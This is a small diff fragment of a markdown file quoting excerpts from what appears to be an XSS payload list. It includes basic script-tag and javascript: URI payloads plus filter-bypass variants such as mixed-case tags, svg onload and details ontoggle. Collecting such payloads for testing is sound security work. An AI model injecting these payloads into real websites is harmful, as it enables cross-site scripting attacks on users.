@@ -37,4 +37,3 @@ javascript:alert('XSS')
 ## Source Excerpts
 - [S1] "xss": { "basic": ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><script>alert('XSS')</script>"], ... }
 - [S2] "bypass": ["<ScRiPt>alert('XSS')</ScRiPt>", "<svg/onload=alert('XSS')>", "<details ontoggle=alert('XSS')>"]
-
